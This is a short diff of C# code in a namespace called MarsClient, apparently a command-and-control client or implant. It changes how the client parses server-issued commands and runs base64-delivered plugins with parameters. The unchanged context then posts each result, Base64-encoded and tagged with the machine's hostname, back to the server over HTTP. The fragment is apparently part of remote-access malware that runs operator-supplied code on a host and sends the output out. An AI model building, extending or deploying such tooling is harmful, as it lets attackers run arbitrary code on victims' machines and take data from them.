@@ -177,9 +177,9 @@ namespace MarsClient
                         //result = PluginCommand(command[0], null);
                         //if (2 < command.Length){
                         try{
-                            string[] pars = JsonSerializer.Deserialize<string[]>(command[2]);
+                            string[] pars = JsonSerializer.Deserialize<string[]>(command[3]);
                             if (pars != null){
-                                result = RunPluginCommandFromBase64(file, null, pars);
+                                result = RunPluginCommandFromBase64(file, command[2].ToString(), pars);
                             } else {
                                 //Console.WriteLine("hi");
                                 result = RunPluginCommandFromBase64(file, null, null);
@@ -191,7 +191,7 @@ namespace MarsClient
                             result = RunPluginCommandFromBase64(file, null, null);
                         }
                     } else {
-                        result = "Failed";
+                        result = "Failed! Server did not pass an expected command type.";
                     }
                     string responseBody = $"{{\"hostname\": \"{hostname}\",\"response\": \"{Base64EncodeString(result)}\"}}";
                     (bool l, string a) = await BuildAndSendHTTPRequest(new StringContent(responseBody));
